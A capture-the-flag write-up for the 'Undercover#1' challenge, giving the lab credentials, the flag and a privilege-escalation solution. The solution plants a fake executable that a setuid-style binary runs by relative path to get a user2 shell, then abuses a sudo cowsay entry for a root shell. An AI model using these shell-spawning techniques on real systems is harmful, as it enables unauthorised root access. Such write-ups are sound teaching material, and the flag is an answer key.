![](./assets/images/logo.webp)



        
            
# Undercover#1



## Challenge Author(s):
Log_s

## Description:
You have been recruited by the CEO of Hero & Co. to test their security. But before handing you out the assignement, the asked you have to prove yourself, and escalate your privileges on this test system all the way to root.

The base credentials are:

`user1:password123`

## Objective:
Privilege escalation to reach user2 and then get the flag.


## Flag:
`Hero{B4ck_2_b4s1cs}`
# 

# Solution

In `/home` there is an executable called `hmmm`. You can download it and then reversing it using *ghidra*.

This is the `main` function:

    undefined8 main(void)

    {
    __uid_t __euid;
    __uid_t __ruid;
    
    puts("Not sure why, but I\'m gonna set my ruid to my uid.");
    __euid = geteuid();
    __ruid = geteuid();
    setreuid(__ruid,__euid);
    puts("Not sure why, but I\'m gonna run the \'WTFFFFF\' program right now.");
    system("./WTFFFFF");
    return 0;
    }

`user1` is able to run the binary, but is owned by `user2`. 

Since the `WTFFFFF` binary does not exist, you can create it in an intelligent way:

    echo "/bin/bash" > WTFFFFF
    chmod +x WTFFFFF

Now, you're `user2`. 

Using `sudo -l` command, you can see user2's sudo rigths: 

    Matching Defaults entries for user2 on 30b4cc252fc8:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User user2 may run the following commands on 30b4cc252fc8:
        (root) NOPASSWD: /usr/games/cowsay

Now, to get a shell as `root` you can exploit this executable, according to https://gtfobins.github.io/gtfobins/cowsay/ using these commands:

    TF=$(mktemp)
    echo 'exec "/bin/sh";' >$TF
    sudo /usr/games/cowsay -f $TF x

Read the flag!